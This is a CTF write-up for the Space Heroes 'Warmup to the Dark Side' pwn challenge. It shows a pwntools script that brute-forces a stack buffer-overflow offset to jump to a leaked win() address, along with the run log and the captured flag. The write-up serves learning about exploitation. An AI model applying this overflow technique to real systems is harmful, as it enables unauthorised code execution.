---
title: "shctf/pwn: Warmup to the Dark Side"
date: 2022-04-05 15:57:40
tags:
- ctf
- shctf
- pwn
description: "Writeup for the Space Heroes CTF pwn challenge [Warmup to the Dark Side]."
permalink: ctfs/shctf/pwn/warmup-to-the-dark-side/
thumbnail: https://enscribe.dev/image/banner-ctfs.png
---

## 📜 Description

Once you start down the dark path, forever will it dominate your destiny.
(And yes, the binary isn't included)

`nc 0.cloud.chals.io 30096`
**Author**: v10l3nt

---

## 🔍 Detailed Solution

Let's run that `netcat` link to see what's going on:

```text
kali@kali:~/shctf/pwn/warmup-to-the-dark-side$ nc 0.cloud.chals.io 30096
The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c
Jedi Mind tricks dont work on me >>> 
```

We're given an address of the `win()` function... and that's it. If this is a `ret2win` challenge, how are we meant to find the offset of the `$rip` register and overflow it with our code? Of course... we need to brute force it.

In the code snippet below, I got the address provided in the prompt by reading the line and taking its substring (ASLR is enabled, so it's different each time). Then, I slowly increase the buffer of the payload with a loop until I find the right offset of the `$rip`:

```py
from pwn import *
for i in range(0,100):
        p = remote("0.cloud.chals.io", 30096)
        address = p.readlineS()[112:126]
        log.info("Trying offset " + str(i) + " for address " + address)
        p.sendline(b'A'*i + p64(int(address, base=16)))
        output = p.recvallS()
        if "shctf" in output:
                log.success(output)
                break
        p.close()
```

Let's run this script on the server to see if we can get the flag:

```text
...
[*] Trying offset 37 for address 0x55f788f1120c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 38 for address 0x5631d523620c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 39 for address 0x55980d2d520c
[+] Receiving all data: Done (38B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
[*] Trying offset 40 for address 0x55f0008b520c
[+] Receiving all data: Done (95B)
[*] Closed connection to 0.cloud.chals.io port 30096
[+] Jedi Mind tricks dont work on me >>> 
    shctf{I_will_remov3_th3s3_restraints_and_leave_the_c3ll}
```
